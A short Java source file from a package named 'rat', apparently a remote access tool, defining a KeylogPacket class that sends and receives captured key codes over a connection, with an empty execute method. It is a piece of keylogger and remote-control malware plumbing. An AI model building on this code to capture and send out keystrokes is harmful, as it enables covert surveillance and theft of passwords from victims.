package de.sogomn.rat.packet;

import java.awt.event.KeyEvent;

import de.sogomn.rat.ActiveConnection;

public final class KeylogPacket implements IPacket {
	
	private int key;
	
	public KeylogPacket(final int key) {
		this.key = key;
	}
	
	public KeylogPacket() {
		this(KeyEvent.VK_UNDEFINED);
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeInt(key);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		key = connection.readInt();
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		//...
	}
	
}
